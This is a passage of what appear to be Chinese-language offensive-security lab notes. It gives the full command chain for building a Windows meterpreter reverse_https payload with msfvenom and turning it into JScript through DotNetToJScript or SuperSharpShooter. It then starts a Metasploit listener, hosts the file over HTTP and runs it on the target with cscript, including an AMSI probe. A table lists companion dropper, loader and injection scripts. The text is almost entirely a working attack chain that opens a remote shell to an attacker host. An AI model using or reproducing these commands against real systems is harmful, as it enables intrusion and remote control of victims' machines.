msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f csharp   # 字节粘进 payload.cs
csc /target:library /platform:anycpu /out:payload.dll m03-dotnettojscript-payload.cs                   # 工具机 Windows
DotNetToJScript.exe payload.dll --lang=Jscript --ver=v4 -o runner.js                                    # 生成桥接 JS
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT -f raw -o shell.bin          # SuperSharpShooter 备选
./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile shell.bin --payload js --output payload    # 产物 payload.js

# 监听与托管
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost LHOST; set lport LPORT; exploit"
python3 -m http.server 80

# 目标侧
cscript //nologo runner.js                # 本地预验证/无窗口回显跑
echo %PROCESSOR_ARCHITECTURE%            # 先确认位数再定 shellcode
cscript //nologo m03-wsh-amsi-probe.js   # 场景 10：宿主信息 + AMSI 实验
```

## 关联脚本清单

| 脚本 | 行数约 | 说明 |
|---|---|---|
| `m03-simple-dropper.js` | 60 | 下载/保存/可选执行（传输层，A/B 分离用） |
| `m03-dotnettojscript-loader.js` | 90 | DotNetToJScript 产物骨架/粘贴容器 + 预检 |
| `m03-supersharpshooter-loader.js` | 90 | SuperSharpShooter 产物分离式加载（实验） |
| `m03-wsh-amsi-probe.js` | 100 | WSH 宿主信息 + AMSI 动态内容实验 |
| `m03-dotnettojscript-payload.cs` | 110 | C# 第二阶段（[ComVisible] 注入类） |
